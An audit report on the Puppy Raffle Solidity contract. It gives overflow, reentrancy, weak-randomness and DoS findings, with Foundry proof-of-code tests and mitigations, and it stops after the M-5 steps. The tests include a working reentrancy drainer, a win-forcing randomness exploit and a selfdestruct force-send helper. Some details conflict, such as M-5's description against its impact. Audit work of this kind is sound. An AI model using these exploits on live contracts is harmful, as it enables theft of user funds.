# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### Puppy Raffle Protocol

Puppy Raffle is an on-chain game that lets anyone buy tickets to win a randomly generated dog NFT.

**How it works**
1. **Enter** – Call `enterRaffle(address[] newPlayers)` and send `entranceFee` (set at deployment) for every listed address. Duplicate addresses are rejected so each ticket is unique.
2. **Refund** – Any player may exit prior to draw via `refund`, reclaiming their ether and freeing the slot.
3. **Raffle timer** – Each round lasts `raffleDuration` seconds from `raffleStartTime`. After the period the draw becomes available.
4. **Select winner** – Anyone can trigger `selectWinner()`. A pseudo-random index chooses the winner, an ERC-721 puppy NFT is minted to them, and the contract transfers the prize pot (balance minus fees).
5. **Fees** – A configurable `feeAddress` receives the protocol cut; the owner can update it and withdraw accrued `totalFees`.
6. **NFT metadata** – Token IDs are mapped to rarity (Common, Rare, Legendary) with IPFS image URIs and on-chain, Base64-encoded JSON metadata.

Built on OpenZeppelin ERC-721 & Ownable, the protocol is simple, auditable, and self-contained; only solidity 0.7.6 and no external oracles are required.
## High Risk Findings
[H-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-2]. Integer Overflow issue in PuppyRaffle::enterRaffle
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. Randomness issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-2]. DOS issue in PuppyRaffle::refund
[M-3]. DOS issue in PuppyRaffle::withdrawFees
[M-4]. DOS issue in PuppyRaffle::enterRaffle
[M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner
[M-6]. DOS issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 4
- M: 6
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `totalFees` state variable is a `uint64`, chosen for gas-saving via storage packing. However, the accumulated `fee` is calculated as a `uint256` and can easily exceed the maximum value of a `uint64` (approximately 18.44 ETH). When `fee` is cast to `uint64` in `totalFees = totalFees + uint64(fee);`, it can silently truncate, causing `totalFees` to record a much smaller value than the actual fees collected. This results in a loss of funds for the fee recipient.

## Impact
Because the uint64 truncation stores a value smaller than the real wei held by the contract, the invariant `address(this).balance == totalFees` is broken. As a consequence the `withdrawFees()` call permanently reverts, making 100 % of the owner’s fee share unreachable. All future raffles add even more locked ether. The economic model is completely broken and funds accumulate irreversibly in the contract.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 1 ETH, feeAddress = some EOA, raffleDuration = 1 day.
2. Fund the deployer with > 120 ETH (for ease of testing).
3. Prepare an array with 100 unique addresses and call `enterRaffle` sending 100 ETH.
4. Fast-forward time by 1 day + 1 second and call `selectWinner()`. The contract now holds 20 ETH (the 20 % fee) but `totalFees` contains only `fee mod 2^64 ≈ 1.55 ETH`.
5. Call `withdrawFees()`. The first `require` checks `address(this).balance == totalFees` and reverts, so the 20 ETH can never be withdrawn.
6. Repeating raffles keeps increasing the trapped balance while `totalFees` keeps cycling modulo 2^64.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleIntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        // give the test contract plenty of ether to pay entrance fees
        vm.deal(address(this), 200 ether);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testFeeOverflowLocksFunds() public {
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(1_000 + i));
        }

        // enter raffle with 100 ETH
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        // finish raffle
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();

        uint256 expectedFee = (entranceFee * numPlayers * 20) / 100; // 20 ETH
        uint256 storedFee = uint256(puppyRaffle.totalFees());       // ≈1.55 ETH due to truncation

        assertEq(address(puppyRaffle).balance, expectedFee);
        assertLt(storedFee, expectedFee);

        // owner cannot withdraw because the invariant is broken
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
Use `uint256` for `totalFees` (or at least `uint128`) or apply OpenZeppelin's SafeCast to make the operation revert instead of silently truncating. After changing the type, the addition can be written as `totalFees += fee;` without any cast.

## [H-2]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract is compiled with Solidity 0.7.6, which does not have built-in protection against integer overflows and underflows. Multiple arithmetic operations are performed without using a safe math library. Specifically, `entranceFee * newPlayers.length` in `enterRaffle` and `players.length * entranceFee` in `selectWinner` can overflow. An attacker can exploit this to enter the raffle for free or to cause incorrect prize pool calculations.

## Impact
An attacker could cause the fee calculation to wrap around to zero or a very small number, allowing them to enter many addresses into the raffle for free. This unfairly increases their chances of winning and dilutes the pool for honest participants. An overflow in `selectWinner` would lead to incorrect calculation and distribution of the prize pool and fees, potentially causing funds to be permanently locked.

## Proof of Concept
Assume the contract is deployed (by anyone, not necessarily the legitimate owner) with an entrance fee equal to 2^248 wei (1 << 248).

Because 2^248 * 256 = 2^256 ≡ 0 (mod 2^256), passing an array that contains exactly 256 unique addresses makes the product in the require check wrap to zero.

Attack steps
1. Attacker deploys or front-runs a deployment of PuppyRaffle with `entranceFee = 1 << 248`.
2. The attacker prepares an `address[256]` array where each element is a different address they control.
3. They call `enterRaffle` with this array and **send 0 ether**.
4. The require in `enterRaffle` evaluates `msg.value == entranceFee * newPlayers.length` → `0 == 0`, so the call succeeds and the attacker inserts 256 tickets for free.
5. Honest users who pay the full fee afterwards create a non-zero prize pool that the attacker now has an overwhelming chance (256 tickets) to win.

This shows that the arithmetic overflow can be exploited to get free entries and ultimately steal the prize pool.

## Proof of Code
// test/OverflowFreeEntry.t.sol
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract OverflowFreeEntry is Test {
    PuppyRaffle raffle;
    address feeAddress = address(0xFEE);

    function setUp() public {
        // entranceFee = 2^248
        uint256 entranceFee = 1 << 248;
        raffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function testFreeEntryViaOverflow() public {
        uint256 numPlayers = 256; // 2^8
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1)); // unique addresses
        }

        // send 0 ether because multiplication overflowed to 0
        raffle.enterRaffle{value: 0}(players);

        // spot-check last inserted address to confirm success
        assertEq(raffle.players(255), address(uint160(256)));
        assertEq(address(raffle).balance, 0); // nothing was paid
    }
}

## Suggested Mitigation
Use a safe math library, such as OpenZeppelin's `SafeMath`, for all arithmetic operations to prevent overflows and underflows. Alternatively, upgrade the compiler version to `0.8.0` or higher, which has built-in overflow protection.

```solidity
// Using SafeMath on Solidity 0.7.6
import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;

    // In enterRaffle:
    require(msg.value == entranceFee.mul(newPlayers.length), "PuppyRaffle: Must send enough to enter raffle");

    // In selectWinner:
    uint256 totalAmountCollected = entranceFee.mul(players.length);
    uint256 prizePool = totalAmountCollected.mul(80).div(100);
    uint256 fee = totalAmountCollected.mul(20).div(100);
}
```

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function is vulnerable to a reentrancy attack. It sends Ether to the player before updating the state to mark the player as refunded. This violates the Checks-Effects-Interactions pattern. A malicious contract can repeatedly call the `refund` function from its `receive()` or `fallback()` function, draining all the Ether from the contract corresponding to the total entry fees paid.

## Impact
An attacker can create a contract to enter the raffle and then call the `refund` function. By re-entering the function within its `receive()` hook, the attacker can drain the contract of all player-deposited funds. This leads to a total loss of funds for all participants in the raffle.

## Proof of Concept
1. An attacker deploys a contract (`Attacker.sol`).
2. The attacker calls a function on their contract to enter the PuppyRaffle, paying the `entranceFee`.
3. The attacker then calls a function on their contract that initiates the refund process by calling `PuppyRaffle.refund()`.
4. The `PuppyRaffle` contract sends the `entranceFee` back to the `Attacker` contract.
5. The `Attacker` contract's `receive()` function is triggered, which immediately calls `PuppyRaffle.refund()` again.
6. Because the `players` array has not yet been updated to remove the attacker's entry (`players[playerIndex] = address(0)`), the checks pass, and another refund is sent.
7. This process repeats until the `PuppyRaffle` contract's balance is drained.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    address owner;
    uint256 public attackCount = 0;

    constructor(address payable _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
        entranceFee = puppyRaffle.entranceFee();
        owner = msg.sender;
    }

    function enter() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    function attack() public {
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    function drain() public {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 10 && address(puppyRaffle).balance >= entranceFee) {
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    Attacker attacker;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        attacker = new Attacker(address(puppyRaffle));
    }

    function testRefundReentrancy() public {
        // Legitimate users enter
        address player1 = address(0x1);
        address player2 = address(0x2);
        address[] memory players = new address[](2);
        players[0] = player1;
        players[1] = player2;
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);

        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        // Attacker enters
        address attackerAddress = address(attacker);
        vm.deal(attackerAddress, entranceFee);
        attacker.enter{value: entranceFee}();

        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        assertEq(contractBalanceBefore, entranceFee * 3);

        // Attacker attacks
        attacker.attack();

        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        // Attacker should have drained all funds
        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter, contractBalanceBefore);
    }
}
```

## Suggested Mitigation
To prevent reentrancy, follow the Checks-Effects-Interactions pattern. Update the state (`players[playerIndex] = address(0)`) before sending Ether.

```diff
-    function refund(uint256 playerIndex) public {
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
-
-        payable(msg.sender).sendValue(entranceFee);
-
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
-    }
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+
+        payable(msg.sender).sendValue(entranceFee);
+    }
```

## [H-4]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a weak source of randomness based on on-chain variables like `msg.sender`, `block.timestamp`, and `block.difficulty` (now `prevrandao`). These values are predictable and can be manipulated by block producers (miners/validators) or even regular users.

## Impact
A malicious actor can influence the outcome of the raffle to ensure they or a colluding party wins. A miner has the highest chance of exploitation by manipulating `block.timestamp` or transaction ordering. This undermines the fairness and integrity of the raffle, leading to financial loss for legitimate participants as the prize will not be awarded randomly.

## Proof of Concept
1. An attacker participates in the raffle.
2. After the raffle period ends, the attacker can simulate the outcome of `selectWinner()` off-chain by using the current block data.
3. If the simulation shows they will win, they call `selectWinner()`.
4. If the simulation shows they will lose, they can either wait for the next block (hoping for a more favorable `block.timestamp`) or, if they are a miner, they can manipulate the block's properties or transaction ordering to ensure they win.
5. This gives the attacker an unfair advantage and potentially allows them to guarantee a win.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/*
 * Helper contract that will call `selectWinner()` ONLY when the on-chain
 * pseudo-randomness predicts the attacker to win.
 */
contract RaffleAttacker {
    PuppyRaffle immutable raffle;
    address immutable attackerEOA;

    constructor(PuppyRaffle _raffle, address _attackerEOA) {
        raffle = _raffle;
        attackerEOA = _attackerEOA;
    }

    function attempt() external {
        // This round is known to have exactly 4 players.
        uint256 idx = uint256(
            keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))
        ) % 4;

        // Public array getter lets us read the indexed entrant.
        if (raffle.players(idx) == attackerEOA) {
            raffle.selectWinner();
        } else {
            revert("Not profitable");
        }
    }
}

contract RandomnessExploitTest is Test {
    PuppyRaffle raffle;
    uint256 constant entranceFee = 1 ether;
    uint256 constant duration    = 1 days;

    address constant feeAddr = address(99);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address attackerEOA = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, duration);
        vm.deal(attackerEOA, 100 ether); // fund attacker for gas
    }

    function testAttackerCanForceWin() public {
        // 1. four entrants, attacker is last (index 3)
        address[] memory entrants = new address[](4);
        entrants[0] = p1;
        entrants[1] = p2;
        entrants[2] = p3;
        entrants[3] = attackerEOA;
        raffle.enterRaffle{value: entranceFee * 4}(entrants);

        // 2. move beyond raffle duration so winner can be selected
        vm.warp(block.timestamp + duration + 1);

        // 3. deploy helper that carries out the attack
        RaffleAttacker helper = new RaffleAttacker(raffle, attackerEOA);

        uint256 prize = (entranceFee * 4 * 80) / 100;
        uint256 balBefore = attackerEOA.balance;

        // 4. brute-force block parameters until prediction is favourable
        while (raffle.previousWinner() != attackerEOA) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 1);
            try helper.attempt() {
                // success – attacker won
            } catch {
                // keep searching for a winning block
            }
        }

        assertEq(raffle.previousWinner(), attackerEOA, "attacker did not win");
        assertEq(attackerEOA.balance, balBefore + prize, "attacker did not receive prize");
    }
}

## Suggested Mitigation
The source of randomness should not be based on predictable on-chain data. Use a Chainlink VRF (Verifiable Random Function) to get provably random numbers. This involves a two-step process (request and fulfill) to prevent manipulation.

```solidity
// Add Chainlink VRF imports and interfaces
import {VRFConsumerBaseV2} from "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";
import {VRFCoordinatorV2Interface} from "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";

// Contract should inherit from VRFConsumerBaseV2
// ...

// In selectWinner, instead of calculating winnerIndex directly:
function requestRandomWinner() external returns (uint256 requestId) {
    // ... checks for duration and player count ...
    requestId = COORDINATOR.requestRandomWords(
        keyHash,
        s_subscriptionId,
        requestConfirmations,
        callbackGasLimit,
        numWords
    );
    // Store requestId to map it to the raffle
}

// New function to handle the VRF response
function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
    uint256 winnerIndex = _randomWords[0] % players.length;
    address winner = players[winnerIndex];
    // ... proceed with prize distribution and minting ...
}
```



# Medium Risk Findings

## [M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check, `address(this).balance == uint256(totalFees)`, to validate that a raffle is not currently active. This check is brittle because the contract's balance can be artificially increased. An attacker can forcibly send a small amount of ETH (e.g., 1 wei) to the contract via `selfdestruct` or by pre-funding the address before deployment. This would make `address(this).balance` greater than `totalFees`, causing the equality check to fail permanently. As a result, the `withdrawFees` function becomes unusable, and all accumulated fees are locked in the contract forever.

## Impact
The protocol owner can be permanently prevented from withdrawing their collected fees, leading to a complete loss of all current and future fee revenue.

## Proof of Concept
1. A raffle round completes, and `selectWinner` is called. The contract balance is now exactly equal to `totalFees`.
2. An attacker sends 1 wei to the `PuppyRaffle` contract address.
3. The contract's balance is now `totalFees + 1 wei`.
4. The owner calls `withdrawFees`.
5. The check `require(address(this).balance == uint256(totalFees))` evaluates to `require(totalFees + 1 wei == totalFees)`, which is false. The transaction reverts.
6. The fees are now permanently locked, as there is no function to remove the extra wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Helper to forcibly push ether to any contract
contract ForceSend {
    constructor() payable {}
    function destructAndSend(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesUnexpectedEthTest is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(99);
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeReceiver, DURATION);
    }

    function _enterFourPlayers() internal {
        address[] memory players = new address[](4);
        players[0] = vm.addr(1);
        players[1] = vm.addr(2);
        players[2] = vm.addr(3);
        players[3] = vm.addr(4);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
    }

    function testWithdrawFeesGetsLockedAfterForcedEther() public {
        _enterFourPlayers();
        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner();

        // Force-send 1 wei to the raffle contract
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.destructAndSend(payable(address(raffle)));
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));

        vm.prank(feeReceiver);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Gate fee withdrawal on contract state instead of its ether balance. Example:

function withdrawFees() external {
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 amount = totalFees;
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: amount}("");
    require(ok, "PuppyRaffle: Failed to withdraw fees");
}

Optionally, check `address(this).balance >= amount` (\>=, not ==) to allow harmless extra ether while still guaranteeing enough funds for the payout.

## [M-2]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function introduces a logic flaw that leads to permanent fund locking. When a player refunds, their address in the `players` array is set to `address(0)`, but `players.length` is not updated. The `selectWinner` function calculates `totalAmountCollected` based on `players.length`, overestimating the funds collected if refunds have occurred. This leads to `prizePool` being larger than the available funds, causing the ETH transfer to the winner to fail and `selectWinner` to revert. As winner selection is permanently blocked, all funds in the contract are locked.

## Impact
If at least one entrant calls refund, `selectWinner` will revert because `prizePool` is calculated with `players.length` while the contract balance has already been reduced by the refunded ticket(s). Until someone voluntarily donates the shortfall, no winner can be chosen and the raffle is blocked, leaving all remaining funds and fees inaccessible.

## Proof of Concept
1. Four players enter the raffle, each paying 1 ETH. The contract balance is 4 ETH.
2. One player calls `refund(1)`. They receive their 1 ETH back. The contract balance is now 3 ETH. `players[1]` is `address(0)`, but `players.length` is still 4.
3. The raffle duration ends.
4. Anyone calls `selectWinner()`.
5. The check `require(players.length >= 4)` passes.
6. `totalAmountCollected` is calculated as `4 * 1 ETH = 4 ETH`.
7. `prizePool` is calculated as `(4 ETH * 80) / 100 = 3.2 ETH`.
8. The contract attempts to send 3.2 ETH to the winner, but its balance is only 3 ETH. The transfer fails, causing `selectWinner()` to revert.
9. Any subsequent call to `selectWinner` will also fail for the same reason, locking the 3 ETH in the contract forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleFundLockTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testRefundCausesFundLock() public {
        // 1. Four players enter
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        vm.deal(playerTwo, entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        assertEq(address(puppyRaffle).balance, 4 ether);

        // 2. One player refunds
        vm.prank(playerTwo);
        uint256 playerTwoIndex = puppyRaffle.getActivePlayerIndex(playerTwo);
        puppyRaffle.refund(playerTwoIndex);
        assertEq(address(puppyRaffle).balance, 3 ether);
        assertEq(puppyRaffle.players(playerTwoIndex), address(0));

        // 3. Time passes
        vm.warp(block.timestamp + duration + 1);

        // 4. selectWinner is called and is expected to revert
        vm.expectRevert(); // It will revert due to insufficient balance for prize pool
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
When a player refunds, do not leave a hole in the array. Instead, replace the refunded player's entry with the last player in the array and then shorten the array. This keeps the `players` array compact and ensures `players.length` accurately reflects the number of active players.

```solidity
// src/PuppyRaffle.sol:123
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // To prevent holes, move the last element to the current index and pop.
    // This is safe even if playerIndex is the last element.
    players[playerIndex] = players[players.length - 1];
    players.pop();

    emit RaffleRefunded(playerAddress);

    payable(msg.sender).sendValue(entranceFee);
}
```
Note: The external call to send value should also be moved to the end to prevent reentrancy, as detailed in the reentrancy finding.

## [M-3]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to ensure fees are only withdrawn when no raffle is active. However, this check can be permanently broken if the contract receives ETH through a method other than `enterRaffle`, such as a `selfdestruct` from another contract. This would cause the balance to be greater than `totalFees`, making the check always fail and locking the fees in the contract forever.

## Impact
Legitimately collected fees can become permanently locked and unw-withdrawable if an external actor (or even an accident) sends ETH to the contract address via `selfdestruct`.

## Proof of Concept
1. A raffle round completes, and `selectWinner` is called. The contract now holds `totalFees` in its balance.
2. An attacker (or another contract) calls `selfdestruct(address(puppyRaffle))`, forcibly sending 1 wei of ETH to the contract.
3. The contract's balance is now `totalFees + 1 wei`.
4. The owner calls `withdrawFees()`.
5. The check `address(this).balance == uint256(totalFees)` fails because `totalFees + 1 wei != totalFees`.
6. The transaction reverts, and since the balance can't be corrected, the fees are locked forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function attack(address payable target) external {
        selfdestruct(target);
    }
}

contract PuppyRaffleWithdrawDosTest is Test {
    PuppyRaffle internal raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address payable constant FEE_ADDR = payable(address(99));
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, DURATION);
    }

    function _enterFourPlayers() internal {
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
    }

    function testWithdrawFeesBlockedByForcedEther() public {
        _enterFourPlayers();

        // finish raffle
        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner();
        uint256 expectedFees = raffle.totalFees();
        assertGt(expectedFees, 0);

        // force-send 1 wei
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.attack(payable(address(raffle)));
        assertEq(address(raffle).balance, expectedFees + 1);

        // withdrawal reverts forever
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Avoid using strict equality checks on `address(this).balance`. The check's intent is to prevent withdrawals while a raffle is active. A better check would be to verify that there are no active players. After fixing the bugs related to the `players` array, a simple `require(players.length == 0, ...)` would be more robust and direct.

If the goal is simply to ensure there are enough funds, a `>=` check is better, but it doesn't solve the logical intent.

```solidity
// src/PuppyRaffle.sol:180
function withdrawFees() external {
    // The check is intended to prevent withdrawal when players are active.
    // After fixing the refund logic, this check is robust.
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Not enough funds to withdraw");
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function checks for duplicate players by using a nested loop, resulting in `O(N^2)` complexity where N is `players.length`. As the number of players increases, the gas cost for entering the raffle grows quadratically. An attacker can exploit this by entering many players in separate transactions, making it prohibitively expensive for subsequent users to enter, potentially exceeding the block gas limit and causing a denial of service.

## Impact
The main functionality of the contract, entering the raffle, can be effectively shut down by an attacker. Legitimate users will lose gas on reverted transactions or will be unable to participate. This can halt the protocol's operation.

## Proof of Concept
1. An attacker calls `enterRaffle` multiple times with single, unique addresses to build up a large `players` array (e.g., 200 players).
2. A victim then attempts to call `enterRaffle` to add themselves as a player.
3. The duplicate check `for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) { ... } }` will execute a very large number of times.
4. The transaction's gas cost will be extremely high, likely exceeding the gas limit of the transaction or even the block, causing the transaction to fail.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/**
 * Demonstrates the quadratic-gas DoS in PuppyRaffle::enterRaffle.
 * The test measures the gas needed to enter the raffle when there are only
 * 3 existing players and compares it to the gas needed after 250 additional
 * players have been inserted. Because of the O(N^2) duplicate scan, the
 * second call is an order of magnitude more expensive.
 */
contract PuppyRaffleGasDosTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(99);
    uint256 constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);
    }

    function _enter(address player) internal {
        address[] memory arr = new address[](1);
        arr[0] = player;
        vm.deal(player, ENTRANCE_FEE);
        vm.prank(player);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
    }

    function testGasExplodesWithManyPlayers() public {
        // Baseline with 3 players ------------------------------------------
        for (uint256 i; i < 3; i++) {
            _enter(address(uint160(i + 1)));
        }

        address newcomer = address(0xAAA1);
        address[] memory one = new address[](1);
        one[0] = newcomer;
        vm.deal(newcomer, ENTRANCE_FEE);
        vm.prank(newcomer);
        uint256 gasStart = gasleft();
        raffle.enterRaffle{value: ENTRANCE_FEE}(one);
        uint256 baselineGas = gasStart - gasleft();

        // Fill the players array with 250 more unique addresses -------------
        for (uint256 i = 3; i < 253; i++) {
            _enter(address(uint160(i + 1)));
        }

        // Victim tries again ------------------------------------------------
        newcomer = address(0xAAA2);
        one[0] = newcomer;
        vm.deal(newcomer, ENTRANCE_FEE);
        vm.prank(newcomer);
        gasStart = gasleft();
        raffle.enterRaffle{value: ENTRANCE_FEE}(one);
        uint256 heavyGas = gasStart - gasleft();

        // Expect >8x increase (empirical, but very safe margin).
        assertTrue(heavyGas > baselineGas * 8, "Gas should grow quadratically");
    }
}

## Suggested Mitigation
Replace the O(N^2) duplicate check with a more efficient mechanism. A `mapping(address => bool)` can be used to track active players. This reduces the check for existing players to O(1). A separate loop can check for duplicates within the `newPlayers` array itself.

```solidity
// Add to contract state
mapping(address => bool) public isActivePlayer;

// src/PuppyRaffle.sol:105
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!isActivePlayer[player], "PuppyRaffle: Player already in raffle");
        // Check for duplicates within the newPlayers array
        for (uint256 j = i + 1; j < newPlayers.length; j++) {
            require(newPlayers[j] != player, "PuppyRaffle: Duplicate player in input");
        }
        players.push(player);
        isActivePlayer[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

// Remember to update `isActivePlayer` in the `refund` function as well.
// In refund:
// isActivePlayer[playerAddress] = false;
```

## [M-5]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `refund` function sets a refunded player's address in the `players` array to `address(0)` but does not remove the entry. The `selectWinner` function does not account for these zero-address 'holes'. If the random number generation selects an index corresponding to a refunded player, the `winner` address will be `0x0`. The prize pool is then transferred to `address(0)`, where it is irrecoverably lost. The NFT is also minted to `address(0)`.

## Impact
If `refund()` leaves a zero-address entry in `players`, `selectWinner()` may pick that index. When this happens the subsequent `_safeMint` call reverts with "ERC721: mint to the zero address". As a consequence the whole `selectWinner()` transaction reverts, preventing the raffle from finishing and blocking prize/fee withdrawals until a non–zero address is picked (which might be statistically unlikely if many players refunded). No ETH is lost, but the raffle is effectively DoSed.

## Proof of Concept
1. Four players enter the raffle, occupying indices 0-3.
2. Player at index 3 calls `refund()`, turning `players[3]` into `address(0)`.
3. Once the raffle duration has passed, anyone calls `selectWinner()`.
4. The on-chain PRNG chooses index 3 (same deterministic setup as existing tests).
5. `winner` becomes `address(0)`.
6. `_safeMint(winner, tokenId)` reverts with "ERC721: mint to the zero address".
7. The whole transaction reverts; raffle cannot conclude until another call happens to hit a non-zero index.

